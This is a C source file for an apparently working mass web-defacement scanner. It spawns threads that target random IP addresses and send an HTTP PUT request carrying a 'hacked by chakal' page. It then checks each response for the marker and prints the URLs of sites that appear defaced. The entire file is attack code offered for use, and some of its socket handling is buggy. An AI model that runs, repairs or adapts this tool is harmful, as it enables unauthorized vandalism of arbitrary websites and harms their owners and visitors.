#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <netdb.h>

char *content = "%3Ch1%3Ehacked%20by%20chakal%3C%2Fh1%3E"; // url encoded html for deface
char *check = "chakal"; // small part of the html to check if hake worked
struct timeval tv;

char *make_get(char *tgtip) {
 char *req = malloc(2048);
 sprintf(req, "PUT / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: keep-alive\r\nAccept: */*\r\nAccept-Encoding: gzip\r\nContent-Length: %ld\r\n\r\n%s", tgtip, strlen(content), content);
 return req;
}

int makesa(char *tgtip, struct sockaddr_in sa) {
 struct hostent *hostw;
 if((hostw = gethostbyname(tgtip)) != 0) {
  sa.sin_addr.s_addr = *((unsigned int *)hostw->h_addr);
  sa.sin_port = htons(80); 
  sa.sin_family = AF_INET;
  return 1;
 } else {
  return 0;
 }
}

char *makerand() {
 int a,b,c,d;
 a = rand() % (254 - 0) + 0;
 b = rand() % (254 - 0) + 0;
 c = rand() % (254 - 0) + 0;
 d = rand() % (254 - 0) + 0;
 char *tgtip = malloc(32);
 sprintf(tgtip, "%d.%d.%d.%d", a, b, c, d);
 return tgtip;
}

void *dos(void *unused) {
 int fd = socket(AF_INET, SOCK_STREAM, 0); 
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
 char *tgtip = makerand();
 struct sockaddr_in sa;
 char *req = make_get(tgtip);
 if((makesa(tgtip, sa))) {
  if(connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != -1) {
   send(fd, req, strlen(req), MSG_NOSIGNAL); 
   char *resp = malloc(1024);
   recv(fd, resp, 1024, MSG_NOSIGNAL);
   if(strstr(resp, check)) {
    dprintf(1, "http://%s/ seems to be haked\n", tgtip);
   }
   free(resp);
  }
 }
 free(req);
 close(fd);
 free(tgtip);
}


int make_threads(int threadnum) {
 pthread_t threadg[threadnum];
 while(1) {
  for(int i = 0; i < threadnum; i++) {
   pthread_create(&threadg[i], 0, &dos, 0);
  }
  for(int i = 0; i < threadnum; i++) {
   pthread_join(threadg[i], 0);
  }
 } 
}

int main(int argc, char **argv) {
 tv.tv_sec = 1;
 srand(time(0));
 if(argc < 2) {
  dprintf(1, "threads\n");
  return 0;
 }
 make_threads(atoi(argv[1]));
 dprintf(1, "Started.\n");
}
